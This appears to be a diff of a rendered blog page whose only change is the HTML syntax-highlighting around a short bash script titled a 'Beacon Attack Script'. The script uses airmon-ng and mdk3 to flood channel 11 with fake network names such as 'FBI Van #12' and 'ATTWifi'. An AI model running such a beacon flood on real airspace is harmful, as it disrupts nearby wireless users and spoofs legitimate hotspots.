@@ -51,38 +51,38 @@
 
 <p>You must have aircrack and mdk3 installed.</p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">networks</span><span class="o">=</span><span class="p">(</span>
-<span class="s2">"FreeWifi"</span>
-<span class="s2">"FBI Van #12"</span>
-<span class="s2">"Customer Wireless"</span>
-<span class="s2">"Visitors"</span>
-<span class="s2">"ATTWifi"</span>
-<span class="s2">"Verizon Hotspot"</span>
-<span class="s2">"l33t haxor net"</span>
-<span class="p">)</span>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">networks</span><span class="o">=</span><span class="p">(</span><span class="w">
+</span><span class="s2">"FreeWifi"</span><span class="w">
+</span><span class="s2">"FBI Van #12"</span><span class="w">
+</span><span class="s2">"Customer Wireless"</span><span class="w">
+</span><span class="s2">"Visitors"</span><span class="w">
+</span><span class="s2">"ATTWifi"</span><span class="w">
+</span><span class="s2">"Verizon Hotspot"</span><span class="w">
+</span><span class="s2">"l33t haxor net"</span><span class="w">
+</span><span class="p">)</span><span class="w">
 
-<span class="k">if</span> <span class="p">[</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span> <span class="p">]</span>
-<span class="k">then</span>
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;31mDeleting list of network names</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="n">rm</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span>
-<span class="n">fi</span>
+</span><span class="kr">if</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="kt">ssid_names</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span><span class="nf">then</span><span class="w">
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;31mDeleting list of network names\e[0m"</span><span class="w">
+</span><span class="nf">rm</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">ssid_names</span><span class="w">
+</span><span class="nf">fi</span><span class="w">
 
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mCreating list of network names</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="s2">"${networks[@]}"</span>
-<span class="k">do</span>
-<span class="n">echo</span> <span class="vg">$i</span> <span class="o">&gt;&gt;</span> <span class="n">ssid_names</span>
-<span class="n">done</span>
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;32mCreating list of network names\e[0m"</span><span class="w">
+</span><span class="kr">for</span><span class="w"> </span><span class="nf">i</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="s2">"</span><span class="nv">${networks[@]}</span><span class="s2">"</span><span class="w">
+</span><span class="kr">do</span><span class="w">
+</span><span class="nf">echo</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ssid_names</span><span class="w">
+</span><span class="nf">done</span><span class="w">
 
-<span class="k">if</span> <span class="p">[[</span> <span class="o">-</span><span class="n">n</span> <span class="err">$</span><span class="p">(</span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">mon0</span><span class="p">)</span> <span class="p">]]</span>
-<span class="k">then</span>
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mMon0 interface exists</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="k">else</span>
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mStarting AirMon on wlan0</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
-<span class="n">fi</span>
+</span><span class="kr">if</span><span class="w"> </span><span class="p">[[</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="kt">airmon</span><span class="nt">-ng</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="kt">grep</span><span class="w"> </span><span class="kt">mon0</span><span class="p">)</span><span class="w"> </span><span class="p">]]</span><span class="w">
+</span><span class="nf">then</span><span class="w">
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;32mMon0 interface exists\e[0m"</span><span class="w">
+</span><span class="kr">else</span><span class="w">
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;32mStarting AirMon on wlan0\e[0m"</span><span class="w">
+</span><span class="nf">airmon-ng</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">wlan0</span><span class="w">
+</span><span class="nf">fi</span><span class="w">
 
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mBegin beacon flood on mon0</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="n">mdk3</span> <span class="n">mon0</span> <span class="n">b</span> <span class="o">-</span><span class="n">c</span> <span class="mi">11</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span></code></pre></figure>
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;32mBegin beacon flood on mon0\e[0m"</span><span class="w">
+</span><span class="nf">mdk3</span><span class="w"> </span><span class="nx">mon0</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">11</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">ssid_names</span></code></pre></figure>
 
 
   </div><a class="u-url" href="/it/2014/05/20/Beacon-Attack-Script.html" hidden></a>
